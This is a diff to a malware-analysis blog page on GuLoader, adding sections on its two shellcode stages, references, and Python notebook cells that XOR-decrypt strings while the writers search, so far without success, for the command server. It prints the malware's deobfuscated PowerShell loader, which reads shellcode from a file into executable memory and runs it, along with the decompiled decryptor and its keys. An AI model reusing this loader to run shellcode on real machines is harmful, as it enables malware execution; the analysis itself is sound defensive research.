@@ -79,7 +79,7 @@ window.onload = wrap_img;
        • <span class="read-time" title="Estimated read time">
     
     
-      4 min read
+      6 min read
     
 </span></p>
 
@@ -167,9 +167,10 @@ window.onload = wrap_img;
 <li class="toc-entry toc-h4"><a href="#Stage-2">Stage 2 </a></li>
 <li class="toc-entry toc-h4"><a href="#Stage-3">Stage 3 </a></li>
 <li class="toc-entry toc-h4"><a href="#Shellcode-Loader">Shellcode Loader </a></li>
+<li class="toc-entry toc-h4"><a href="#Guloader-Shellcode-Stage-1">Guloader Shellcode Stage 1 </a></li>
+<li class="toc-entry toc-h4"><a href="#Guloader-Shellcode-Stage-2">Guloader Shellcode Stage 2 </a></li>
 </ul>
 </li>
-<li class="toc-entry toc-h3"><a href="#Stage-4---Shellcode-Buffer-1">Stage 4 - Shellcode Buffer 1 </a></li>
 </ul>
 </li>
 </ul><!--
@@ -198,6 +199,7 @@ window.onload = wrap_img;
 <li><a href="https://unit42.paloaltonetworks.com/guloader-variant-anti-analysis/">Defeating Guloader Anti-Analysis Technique</a></li>
 <li><a href="https://www.spamhaus.com/resource-center/dissecting-the-new-shellcode-based-variant-of-guloader-cloudeye/">Dissecting the new shellcode-based variant of GuLoader (CloudEyE)</a></li>
 <li><a href="https://www.fortinet.com/blog/threat-research/spoofed-saudi-purchase-order-drops-guloader-part-two">Spoofed Saudi Purchase Order Drops GuLoader – Part 2</a></li>
+<li><a href="https://www.crowdstrike.com/blog/guloader-dissection-reveals-new-anti-analysis-techniques-and-code-injection-redundancy/">Malware Analysis: GuLoader Dissection Reveals New Anti-Analysis Techniques and Code Injection Redundancy (published after our notes)</a></li>
 </ul>
 
 </div>
@@ -811,11 +813,194 @@ $Casuistically2="rgmlfaelooallpmlvlnvuislrreellesglrrslrndsrfooorrtyvenaudpoubrp
 <a class="anchor" href="#Shellcode-Loader" aria-hidden="true"><span class="octicon octicon-link"></span></a>Shellcode Loader<a class="anchor-link" href="#Shellcode-Loader"> </a>
 </h4>
 <p>Once the strings have been decrypted it is clear that the powershell is used to read shellcode from the <code>Semiskilled.Slv</code> file. This code is split at 0x400 and 0x53c and copied into two allocated buffers. The first buffer is then called and the second buffer passed as an argument along with a pointer to <code>NtProtectVirtualMemory</code>.</p>
-<h3 id="Stage-4---Shellcode-Buffer-1">
-<a class="anchor" href="#Stage-4---Shellcode-Buffer-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 4 - Shellcode Buffer 1<a class="anchor-link" href="#Stage-4---Shellcode-Buffer-1"> </a>
-</h3>
-<p>The first shellcode buffer can be found on malshare <a href="https://malshare.com/sample.php?action=detail&amp;hash=84087a23b64f5eef5e0f08457645db07f8b90beff391715f0e8cae7172a3510b">here</a> and the second shellcode buffer (passed as an argument) can be found on malshare <a href="https://malshare.com/sample.php?action=detail&amp;hash=fd7656b8088de9c18b5edf1c36f7d9c9c7e1b8cef931f2b05ea93c5271546b8b">here</a>.</p>
-<p><strong>analysis TBD</strong></p>
+
+</div>
+</div>
+</div>$Buffer1_RWX = $VirtualAlloc.Invoke([IntPtr]::Zero,     316, 0x3000, PAGE_EXECUTE_READWRITE)
+$Buffer2_RW = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x100000, 0x3000, PAGE_READWRITE)
+
+$ShellCode = [System.IO.File]::ReadAllBytes('$env:LOCALAPPDATA\Ecphorize\Gonocoele\Semiskilled.Slv')
+
+[System.Runtime.InteropServices.Marshal]::Copy($ShellCode, 1024,  $Buffer1_RWX , 316)
+
+[System.Runtime.InteropServices.Marshal]::Copy($ShellCode, 316+1024, $Buffer2_RW , $ShellCode.count-316-1024)
+
+$ShellCodeEntry = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Buffer1_RWX , (GDT @([IntPtr],[IntPtr]) ([Void])))
+
+$ShellCodeEntry.Invoke($Buffer2_RW , fkp ntdll NtProtectVirtualMemory)
+
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h4 id="Guloader-Shellcode-Stage-1">
+<a class="anchor" href="#Guloader-Shellcode-Stage-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Guloader Shellcode Stage 1<a class="anchor-link" href="#Guloader-Shellcode-Stage-1"> </a>
+</h4>
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>The first stage of the shellcode has heavy obfuscation but it is a simple loader and decryptor used to decrypt the buffer that is passed as an argument from the PowerShells script. The decryption is an XOR with the key 0xA980E98A.</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="n">__usercall</span> <span class="n">sub_0</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="err">@</span><span class="o">&lt;</span><span class="n">ebp</span><span class="o">&gt;</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">a2</span><span class="p">)(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// ebp</span>
+  <span class="kt">void</span> <span class="p">(</span><span class="kr">__stdcall</span> <span class="o">*</span><span class="n">v4</span><span class="p">)(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span> <span class="c1">// edx</span>
+  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// esi</span>
+  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// ecx</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// eax</span>
+
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">a1</span> <span class="o">-</span> <span class="mi">768</span><span class="p">;</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">256</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x100000</span><span class="p">;</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">260</span><span class="p">)</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__stdcall</span> <span class="o">*</span><span class="p">)(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">))(</span><span class="n">a3</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">do</span>
+      <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">+</span> <span class="n">v6</span><span class="p">)</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="p">);</span>
+    <span class="o">++</span><span class="n">v5</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="n">v6</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xB8</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">v4</span><span class="p">(</span><span class="mi">-1</span><span class="p">,</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">260</span><span class="p">,</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">156</span><span class="p">);</span>
+      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">!=</span> <span class="mh">0x29B28</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span> <span class="p">)</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">a2</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^=</span> <span class="mh">0xA980E98A</span><span class="p">;</span>
+      <span class="n">a2</span><span class="p">();</span>
+      <span class="n">JUMPOUT</span><span class="p">(</span><span class="mh">0x13C</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h4 id="Guloader-Shellcode-Stage-2">
+<a class="anchor" href="#Guloader-Shellcode-Stage-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Guloader Shellcode Stage 2<a class="anchor-link" href="#Guloader-Shellcode-Stage-2"> </a>
+</h4>
+<p>The second stage shellcode is a version of the main guloader stage2 shellcode. Some of the same functions exist in this shellcode as the original shellcode we analyzed above.</p>
+<p>key_len = 44</p>
+
+</div>
+</div>
+</div>
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s1">'3d4f0b6d845f58cbf8844e9ab35781156c68109175e8c42901f8ee2b78c4926631939c778b2a48e0d8ea0dd585'</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+    
+
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="k">def</span> <span class="nf">xor_crypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
+        <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+
+<span class="n">egg</span> <span class="o">=</span> <span class="n">xor_crypt</span><span class="p">(</span><span class="sa">b</span><span class="s1">'http'</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">egg</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
+
+<span class="n">stage2_data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/Semiskilled.Slv_shellcode_stage_2_patched.bin'</span><span class="p">,</span><span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="n">c2_offset</span> <span class="o">=</span> <span class="n">stage2_data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">c2_offset</span><span class="p">)</span>
+
+<span class="n">xor_crypt</span><span class="p">(</span><span class="n">stage2_data</span><span class="p">[</span><span class="n">c2_offset</span><span class="p">:</span><span class="n">c2_offset</span><span class="o">+</span><span class="mi">100</span><span class="p">],</span> <span class="n">key</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+<div class="output_wrapper">
+<div class="output">
+
+<div class="output_area">
+
+<div class="output_subarea output_stream output_stdout output_text">
+<pre>553b7f1d
+-1
+</pre>
+</div>
+</div>
+
+<div class="output_area">
+
+
+
+<div class="output_text output_subarea output_execute_result">
+<pre>b''</pre>
+</div>
+
+</div>
+
+</div>
+</div>
+
+</div>
+    
+
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s1">'48 4F 78 6D E1 5F 2A CB CB 84 7C 9A'</span><span class="p">)</span>
+<span class="n">xor_crypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">,</span><span class="sa">b</span><span class="s1">''</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+<div class="output_wrapper">
+<div class="output">
+
+<div class="output_area">
+
+
+
+<div class="output_text output_subarea output_execute_result">
+<pre>b'user32'</pre>
+</div>
+
+</div>
+
+</div>
+</div>
+
+</div>
+    
+
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p><strong>TODO</strong> our trick didn't work, we will have to investigate stage2 further to determine where the c2 is stored.</p>
 
 </div>
 </div>
@@ -836,7 +1021,7 @@ $Casuistically2="rgmlfaelooallpmlvlnvuislrreellesglrrslrndsrfooorrtyvenaudpoubrp
     <div class="footer-col-wrapper">
       <div class="footer-col">
         <p class="feed-subscribe">
-          <a href="/feed.xml">
+          <a href="https://research.openanalysis.net/feed.xml">
             <svg class="svg-icon orange">
               <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
             </svg><span>Subscribe</span>
